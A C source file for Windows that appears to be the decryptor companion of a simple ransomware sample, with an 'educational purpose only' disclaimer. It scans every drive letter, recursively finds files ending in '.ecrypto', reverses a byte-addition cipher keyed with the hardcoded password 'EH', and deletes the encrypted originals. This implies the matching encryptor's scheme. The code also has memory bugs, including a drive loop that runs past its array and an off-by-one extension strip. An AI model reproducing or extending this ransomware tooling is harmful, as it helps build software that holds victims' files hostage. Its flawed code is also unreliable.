#include <stdio.h>
#include <windows.h>


/*
Created By EH
------------------------------------------
Educational purpose only
I'm not responsible for your actions
*/

char* drives[26];

int check_path(char* path){
    WIN32_FIND_DATA fdfile;
    HANDLE hfind = NULL;

    char newpath[2049];
    sprintf(newpath, "%s\\*.*", path);

    if ( (hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE ){
        return 0;
    }

    FindClose(hfind);
    
    return 1;
}


void get_drives(){
    char* letters[26] = {
        "A:\\", "B:\\", "D:\\", "E:\\", "F:\\",
        "G:\\", "H:\\", "I:\\", "J:\\", "K:\\",
        "L:\\", "M:\\", "N:\\", "O:\\", "P:\\",
        "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\",
        "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\",
        "C:\\"
    };
    int count = 0;

    for (int i = 0; i < 26; i++){
        if (check_path(letters[i]) == 1){
            drives[count] = letters[i];
            count++;
        }
    }
}


int decrypt(char* filename, char* outfile, char* pwd) {
    FILE* fpr;
    FILE* fpw;
    char buffer[1];

    if ((fpr = fopen(filename, "rb")) == NULL || (fpw = fopen(outfile, "wb")) == NULL) {
        return 1;
    }

    while (fread(buffer, sizeof(buffer), 1, fpr)) {
        for (char* c = pwd; *c != '\0'; c++) {
            buffer[0] += *c;
        }
        fwrite(buffer, sizeof(buffer), 1, fpw);
    }
    
    fclose(fpr);
    fclose(fpw);
    remove(filename);

    return 0;
}


int get_size(char* userin){
    int out = 0;
    for (int i = 0; userin[i] != '\0'; i++, out++);

    return out;
}


int check_txt(char* userin){
    int len = get_size(userin) - 1;
    char match[8] = {'.', 'e', 'c', 'r', 'y', 'p', 't', 'o'};

    for (int i = 7; i >= 0; i--){
        if (userin[len] == match[i]){
            len--;
        }else{
            return 0;
        }
    }

    return 1;
}


int get_file(char* path){
    WIN32_FIND_DATA fdfile;
    HANDLE hfind = NULL;

    char newpath[2048];
    char outname[2000];
    int i;

    sprintf(newpath, "%s\\*.*", path);

    if ((hfind = FindFirstFile(newpath, &fdfile)) == INVALID_HANDLE_VALUE){
        return 1;
    }

    do
    {

        if (strcmp(fdfile.cFileName, ".") != 0 && strcmp(fdfile.cFileName, "..") != 0){
            sprintf(newpath, "%s\\%s", path, fdfile.cFileName);

            if (fdfile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ){
                get_file(newpath);
            }
            else{
                if (check_txt(fdfile.cFileName)){
                    printf("[*]Decrypting: %s\n", newpath);
                    sprintf(outname, "%s", newpath);
                    int len = get_size(outname);

                    for (i = 7; i >= 0; i-- ){
                        outname[len] = '\0';
                        len--;
                    }

                    decrypt(newpath, outname, "EH");
                }

            }
        }

    } while (FindNextFile(hfind, &fdfile));
    
    FindClose(hfind);
    return 0;
}


int main(){
    get_drives();

    for (int i = 0; *drives[i] != '\0'; i++){
        printf("[*]Scanning %s", drives[i]);
        get_file(drives[i]);
    }

    return 0;
}
